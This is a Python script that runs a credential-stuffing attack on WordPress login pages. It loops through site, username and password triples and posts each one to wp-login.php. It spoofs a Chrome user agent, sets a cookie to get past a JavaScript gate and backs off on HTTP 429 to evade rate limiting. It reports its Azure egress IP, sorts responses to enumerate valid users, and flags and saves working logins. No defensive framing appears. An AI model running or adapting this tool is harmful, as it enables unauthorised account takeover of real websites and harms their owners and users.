#!/usr/bin/env python3
# intent 225365: WP wp-login credential fill from a fresh (Azure) egress.
# Gate-aware: on HTTP 429 sleep 70s and retry the same pair (max 3 retries).
import json, sys, time, urllib.parse, urllib.request, urllib.error, ssl, re

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CK = "hc_js_gate=1; wordpress_test_cookie=WP%20Cookie%20check"
ATT = json.load(open("runner_attempts.json"))
ctx = ssl.create_default_context()

def egress():
    try:
        r = urllib.request.urlopen("https://api.ipify.org", timeout=15, context=ctx)
        return r.read().decode().strip()
    except Exception as e:
        return "ipfail:" + str(e)[:80]

def classify(code, body, scookie):
    if code in (301, 302) and "wordpress_logged_in_" in scookie:
        return "HIT"
    if "is incorrect" in body:
        return "wrong_pw"
    if "Unknown username" in body or "not registered on this site" in body:
        return "no_such_user"
    if "Unknown email address" in body:
        return "no_such_email"
    if "Cookies are blocked" in body:
        return "cookie_blocked"
    if code == 429:
        return "gate429"
    if code == 403 and len(body) < 400:
        return "gate403"
    return "other_%d_%d" % (code, len(body))

def errline(body):
    m = re.search(r'<p class="message[^"]*">(.*?)</p>', body, re.S)
    if m: return re.sub(r"<[^>]+>", "", m.group(1)).strip()[:160]
    m = re.search(r"(Error:[^<]{0,160})", body)
    if m: return m.group(1).strip()[:160]
    return body.strip().replace("\n", " ")[:160]

def post(site, user, pwd):
    url = "https://%s/wp-login.php" % site
    data = urllib.parse.urlencode({
        "log": user, "pwd": pwd, "wp-submit": "Log In",
        "redirect_to": "https://%s/wp-admin/" % site, "testcookie": "1"}).encode()
    req = urllib.request.Request(url, data=data, method="POST", headers={
        "User-Agent": UA, "Cookie": CK,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml"})
    try:
        r = urllib.request.urlopen(req, timeout=30, context=ctx)
        return r.status, r.read().decode("utf-8", "replace"), r.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers.get("Set-Cookie", "") if e.headers else ""

ip = egress()
print("EGRESS_IP=%s" % ip, flush=True)
print("ATTEMPTS=%d" % len(ATT), flush=True)
res = []
for i, (site, user, pwd, tier) in enumerate(ATT):
    for tries in range(4):
        t0 = time.time()
        try:
            code, body, sc = post(site, user, pwd)
        except Exception as e:
            print("%02d EXC %s %s %s" % (i, user, pwd, str(e)[:120]), flush=True)
            time.sleep(2); continue
        cls = classify(code, body, sc)
        el = time.time() - t0
        print("%02d %-22s %-42s %-24s %s %3d %5d %4.1fs | %s" % (
            i, site, user, pwd, cls, code, len(body), el, errline(body)[:110]), flush=True)
        if cls == "gate429":
            if tries < 3:
                print("   ..429 gate, sleeping 70s then retry same pair", flush=True)
                time.sleep(70); continue
        res.append({"i": i, "site": site, "user": user, "pwd": pwd, "tier": tier,
                    "cls": cls, "code": code, "len": len(body),
                    "loc": "", "sc": sc[:200], "msg": errline(body), "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())})
        if cls == "HIT":
            print("   *** HIT *** %s / %s" % (user, pwd), flush=True)
        break
    json.dump(res, open("wpfill49_results.json", "w"), indent=1)
    time.sleep(1.2)

from collections import Counter
print("SUMMARY " + json.dumps(Counter(r["cls"] for r in res)), flush=True)
print("DONE", flush=True)
